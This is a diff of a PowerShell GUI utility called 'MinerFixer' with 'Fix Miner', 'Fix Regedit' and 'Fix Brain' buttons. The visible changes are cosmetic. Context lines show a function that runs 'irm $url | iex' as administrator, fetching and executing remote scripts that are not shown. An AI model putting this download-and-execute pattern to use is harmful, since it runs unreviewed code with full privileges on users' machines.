@@ -10,37 +10,40 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 $form = New-Object System.Windows.Forms.Form
-$form.Text = 'MinerFixer v. 1.2 by t.me/@VayuL'
-$form.Size = New-Object System.Drawing.Size(400, 300)
+$form.Text = 'MinerFixer v. 1.3 by t.me/@VayuL'
+$form.Size = New-Object System.Drawing.Size(400, 350)
 $form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen
 $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
 $form.MaximizeBox = $false
 $form.MinimizeBox = $false
-$form.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 48)
+$form.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 30)
 
 $btnFixMiner = New-Object System.Windows.Forms.Button
 $btnFixMiner.Text = 'Fix Miner'
 $btnFixMiner.Size = New-Object System.Drawing.Size(150, 50)
 $btnFixMiner.Location = New-Object System.Drawing.Point(125, 40)
-$btnFixMiner.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
+$btnFixMiner.BackColor = [System.Drawing.Color]::FromArgb(34, 34, 36)
 $btnFixMiner.ForeColor = [System.Drawing.Color]::White
 $btnFixMiner.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+$btnFixMiner.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
 
 $btnFixRegedit = New-Object System.Windows.Forms.Button
 $btnFixRegedit.Text = 'Fix Regedit'
 $btnFixRegedit.Size = New-Object System.Drawing.Size(150, 50)
 $btnFixRegedit.Location = New-Object System.Drawing.Point(125, 110)
-$btnFixRegedit.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
+$btnFixRegedit.BackColor = [System.Drawing.Color]::FromArgb(34, 34, 36)
 $btnFixRegedit.ForeColor = [System.Drawing.Color]::White
 $btnFixRegedit.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+$btnFixRegedit.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
 
 $btnFixBrain = New-Object System.Windows.Forms.Button
 $btnFixBrain.Text = 'Fix Brain'
 $btnFixBrain.Size = New-Object System.Drawing.Size(150, 50)
 $btnFixBrain.Location = New-Object System.Drawing.Point(125, 180)
-$btnFixBrain.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
+$btnFixBrain.BackColor = [System.Drawing.Color]::FromArgb(34, 34, 36)
 $btnFixBrain.ForeColor = [System.Drawing.Color]::White
 $btnFixBrain.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+$btnFixBrain.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
 
 function Run-CommandAsAdmin($url) {
     $script = "irm $url | iex"
@@ -52,7 +55,8 @@ $lblFinished = New-Object System.Windows.Forms.Label
 $lblFinished.Text = 'Finished'
 $lblFinished.Size = New-Object System.Drawing.Size(200, 40)
 $lblFinished.Location = New-Object System.Drawing.Point(125, 250)
-$lblFinished.ForeColor = [System.Drawing.Color]::Green
+$lblFinished.ForeColor = [System.Drawing.Color]::Lime
+$lblFinished.Font = New-Object System.Drawing.Font('Arial', 12, [System.Drawing.FontStyle]::Bold)
 $lblFinished.Visible = $false
 
 $btnFixMiner.Add_Click({
